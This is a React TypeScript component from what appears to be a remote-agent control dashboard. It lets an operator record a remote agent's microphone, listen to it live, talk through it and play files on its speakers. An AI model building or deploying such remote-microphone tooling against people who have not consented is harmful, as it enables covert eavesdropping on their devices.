import { useEffect, useRef, useState } from 'react'
import { dashboardSocket } from '../utils/socket'
import AudioHistoryPanel from './AudioHistoryPanel'

export default function AudioPanel({ agentId, agentName }: { agentId: string; agentName: string }) {
  const [rate, setRate] = useState<number>(44100)
  const [ch, setCh] = useState<number>(1)
  const [recording, setRecording] = useState(false)
  const [talking, setTalking] = useState(false)
  const [muted, setMuted] = useState(false)
  const [uploading, setUploading] = useState(false)
  const [listening, setListening] = useState(false)
  const [showAudioHistory, setShowAudioHistory] = useState(false)
  const uploadRef = useRef<HTMLInputElement | null>(null)

  // Live talk resources
  const mediaStreamRef = useRef<MediaStream | null>(null)
  const audioCtxRef = useRef<AudioContext | null>(null)
  const procRef = useRef<ScriptProcessorNode | null>(null)

  // Listening playback resources
  const listenCtxRef = useRef<AudioContext | null>(null)
  const scheduleAtRef = useRef<number>(0)
  const oscCanvasRef = useRef<HTMLCanvasElement | null>(null)
  const lastSamplesRef = useRef<Float32Array | null>(null)
  const rafRef = useRef<number | null>(null)

  const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
  const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''

  // --- Agent mic recording (separate start/stop) ---
  const startRecordAgent = async () => {
    dashboardSocket.audioStart(agentId, { sample_rate: rate, channels: ch })
    setRecording(true)
    try { localStorage.setItem(`mc:audioRecording:${agentId}`, '1') } catch {}
  }
  const stopRecordAgent = async () => {
    dashboardSocket.audioStop(agentId)
    setRecording(false)
    try { localStorage.removeItem(`mc:audioRecording:${agentId}`) } catch {}
    // Give backend time to persist and expose in history, then auto-download
    setTimeout(() => autoDownloadLatestAudio(), 1200)
  }

  const autoDownloadLatestAudio = async () => {
    try {
      const url = new URL(`${apiBase}/admin/history`)
      url.searchParams.set('kind', 'audio')
      url.searchParams.set('agent_id', agentId)
      url.searchParams.set('limit', '1')
      const r = await fetch(url.toString(), { headers: { Authorization: `Bearer ${token}` } })
      const j = await r.json()
      const it = Array.isArray(j?.items) && j.items.length ? j.items[0] : null
      if (it && it.storage_url) {
        const a = document.createElement('a')
        a.href = `${apiBase}${it.storage_url}`
        a.download = `audio-${(agentName||agentId).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.wav`
        document.body.appendChild(a); a.click(); a.remove()
      }
    } catch {}
  }

  // --- Upload & play on agent speakers ---
  const onUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    setUploading(true)
    try {
      const fd = new FormData()
      fd.append('file', file)
      const res = await fetch(`${apiBase}/agent/${agentId}/upload`, { method: 'POST', body: fd, headers: { Authorization: `Bearer ${token}` } })
      const j = await res.json()
      const saved: string | undefined = j?.saved
      if (saved) {
        dashboardSocket.audioPlayPath(agentId, saved)
      } else {
        alert('Upload failed')
      }
    } catch {
      // no-op
    }
    setUploading(false)
    if (uploadRef.current) uploadRef.current.value = ''
  }

  // --- Intercom (live talk) ---
  const startTalk = async () => {
    if (talking) return
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
      mediaStreamRef.current = stream
      const ctx = new (window.AudioContext || (window as any).webkitAudioContext)({})
      audioCtxRef.current = ctx
      const src = ctx.createMediaStreamSource(stream)
      const proc = ctx.createScriptProcessor(2048, ch, ch)
      procRef.current = proc
      const actualRate = ctx.sampleRate || rate
      dashboardSocket.intercomStart(agentId, { sample_rate: Math.floor(actualRate), channels: ch })
      proc.onaudioprocess = (ev) => {
        if (muted) return
        const input = ev.inputBuffer
        const frames = input.length
        const nch = Math.min(ch, input.numberOfChannels)
        const interleaved = new Int16Array(frames * nch)
        // Interleave channels
        for (let i = 0; i < frames; i++) {
          for (let c = 0; c < nch; c++) {
            let s = input.getChannelData(c)[i]
            if (s > 1) s = 1
            else if (s < -1) s = -1
            const val = s < 0 ? s * 0x8000 : s * 0x7FFF
            interleaved[i * nch + c] = val
          }
        }
        const b = interleaved.buffer
        const b64 = arrayBufferToBase64(b)
        dashboardSocket.intercomSendChunk(agentId, { pcm_b64: b64 })
      }
      src.connect(proc)
      proc.connect(ctx.destination)
      setTalking(true)
      try { localStorage.setItem(`mc:intercom:${agentId}`, '1') } catch {}
    } catch (e) {
      console.warn('Failed to start live talk', e)
      setTalking(false)
    }
  }

  const stopTalk = () => {
    try { dashboardSocket.intercomStop(agentId) } catch {}
    setTalking(false)
    try { localStorage.removeItem(`mc:intercom:${agentId}`) } catch {}
    setMuted(false)
    try { if (procRef.current) procRef.current.disconnect() } catch {}
    try { if (audioCtxRef.current) audioCtxRef.current.close() } catch {}
    try { mediaStreamRef.current?.getTracks().forEach(t => t.stop()) } catch {}
    mediaStreamRef.current = null
    audioCtxRef.current = null
    procRef.current = null
  }

  const toggleTalk = () => { talking ? stopTalk() : startTalk() }

  const toggleMute = (m: boolean) => {
    setMuted(m)
    try { dashboardSocket.intercomMute(agentId, m) } catch {}
  }

  // --- Start/Stop Listening to agent audio ---
  const handleAudioLiveChunk = (chunk: { pcm_b64: string; rate?: number; ch?: number }) => {
    try { localStorage.setItem(`mc:audioListening:${agentId}`, '1') } catch {}
    try {
      const ctx = listenCtxRef.current || new (window.AudioContext || (window as any).webkitAudioContext)({})
      if (!listenCtxRef.current) listenCtxRef.current = ctx
      const r = Math.floor(chunk.rate || rate)
      const c = Math.min(2, Math.max(1, chunk.ch || ch))
      const raw = atob(chunk.pcm_b64)
      const bytes = new Uint8Array(raw.length)
      for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i)
      const pcm = new Int16Array(bytes.buffer)
      const frames = Math.floor(pcm.length / c)
      const audioBuf = ctx.createBuffer(c, frames, r)
      // de-interleave
      const f32 = new Float32Array(frames * c)
      for (let i = 0; i < frames; i++) {
        for (let chx = 0; chx < c; chx++) {
          const s16 = pcm[i * c + chx]
          f32[i * c + chx] = (s16 < 0 ? s16 / 32768 : s16 / 32767)
        }
      }
      for (let chx = 0; chx < c; chx++) {
        const channelData = audioBuf.getChannelData(chx)
        for (let i = 0; i < frames; i++) channelData[i] = f32[i * c + chx]
      }
      // schedule playback
      let t = scheduleAtRef.current
      const now = ctx.currentTime
      if (!t || t < now) t = now + 0.02
      const src = ctx.createBufferSource()
      src.buffer = audioBuf
      src.connect(ctx.destination)
      src.start(t)
      scheduleAtRef.current = t + audioBuf.duration
      // update chart samples (mono mix)
      const mono = new Float32Array(frames)
      for (let i = 0; i < frames; i++) mono[i] = c === 2 ? 0.5 * (f32[i * c] + f32[i * c + 1]) : f32[i * c]
      lastSamplesRef.current = mono
    } catch {}
  }

  const startListening = () => {
    if (listening) return
    dashboardSocket.onAudioLive(agentId, handleAudioLiveChunk)
    dashboardSocket.audioListenStart(agentId, { sample_rate: rate, channels: ch })
    setListening(true)
  }
  const stopListening = () => {
    dashboardSocket.audioListenStop(agentId)
    dashboardSocket.offAudioLive(agentId, handleAudioLiveChunk)
    setListening(false)
    try { localStorage.removeItem(`mc:audioListening:${agentId}`) } catch {}
    try { if (listenCtxRef.current) listenCtxRef.current.close() } catch {}
    listenCtxRef.current = null
    scheduleAtRef.current = 0
  }

  // Oscilloscope
  useEffect(() => {
    const draw = () => {
      const cvs = oscCanvasRef.current
      const samples = lastSamplesRef.current
      if (!cvs) { rafRef.current = requestAnimationFrame(draw); return }
      const ctx = cvs.getContext('2d')!
      ctx.fillStyle = '#000'; ctx.fillRect(0,0,cvs.width,cvs.height)
      if (samples && samples.length) {
        ctx.strokeStyle = '#9efc9e'; ctx.lineWidth = 1.5; ctx.beginPath()
        const step = Math.max(1, Math.floor(samples.length / cvs.width))
        for (let x = 0; x < cvs.width; x++) {
          const idx = x * step
          const val = samples[Math.min(samples.length-1, idx)] || 0
          const y = Math.round((1 - (val + 1) / 2) * (cvs.height - 1))
          if (x === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y)
        }
        ctx.stroke()
      } else {
        ctx.fillStyle = '#222'; ctx.fillRect(0,0,cvs.width,cvs.height)
      }
      rafRef.current = requestAnimationFrame(draw)
    }
    rafRef.current = requestAnimationFrame(draw)
    return () => { if (rafRef.current) cancelAnimationFrame(rafRef.current) }
  }, [])


  return (
    <div className="card" style={{ marginTop: 10 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
        <h3 style={{ color: '#9efc9e', margin: 0 }}>Audio Control</h3>
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
          <select className="input" value={rate} onChange={(e)=>setRate(parseInt(e.target.value)||44100)} title="Sample rate">
            {[8000,16000,22050,44100,48000].map((r)=>(<option key={r} value={r}>{r} Hz</option>))}
          </select>
          <select className="input" value={ch} onChange={(e)=>setCh(parseInt(e.target.value)||1)} title="Channels">
            <option value={1}>Mono</option>
            <option value={2}>Stereo</option>
          </select>
          <button className="btn" onClick={startRecordAgent}>Start Recording</button>
          <button className="btn secondary" onClick={stopRecordAgent}>Stop Recording</button>
          <button className="btn" onClick={startListening}>Start Listening</button>
          <button className="btn secondary" onClick={stopListening}>Stop Listening</button>
          <button className="btn" onClick={startTalk}>Start Live Talk</button>
          <button className="btn secondary" onClick={stopTalk}>Stop Live Talk</button>
          <label style={{ display: 'inline-flex', alignItems: 'center', gap: 6, color: '#ddd' }}>
            <input type="checkbox" checked={muted} onChange={(e)=>toggleMute(e.target.checked)} disabled={!talking} /> Mute mic
          </label>
          <button className="btn secondary" onClick={() => uploadRef.current?.click()} disabled={uploading}>{uploading ? 'Uploading...' : 'Play File on Agent'}</button>
          <input ref={uploadRef} type="file" accept="audio/*,.wav" style={{ display: 'none' }} onChange={onUpload} />
          <button className="btn secondary" onClick={() => { const url = `${window.location.origin}/audio.html?agentId=${encodeURIComponent(agentId)}&agentName=${encodeURIComponent(agentName)}`; window.open(url, '_blank') }}>Open in New Tab</button>
          <button className="btn secondary" onClick={() => setShowAudioHistory(true)}>Audio History</button>
        </div>
      </div>
      <div style={{ border: '1px solid #222', borderRadius: 6, background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: 160, height: 160 }}>
        <canvas ref={oscCanvasRef} width={800} height={140} style={{ width: '100%', height: '100%' }} />
      </div>
      <div style={{ color: '#777', fontSize: 12, marginTop: 8 }}>
        Tip: Upload WAV for best compatibility. Live talk streams raw PCM; quality depends on device and network.
      </div>
      <AudioHistoryPanel open={showAudioHistory} onClose={() => setShowAudioHistory(false)} agentId={agentId} />
    </div>
  )
}

function arrayBufferToBase64(buf: ArrayBuffer): string {
  let binary = ''
  const bytes = new Uint8Array(buf)
  const len = bytes.byteLength
  for (let i = 0; i < len; i++) binary += String.fromCharCode(bytes[i])
  return btoa(binary)
}
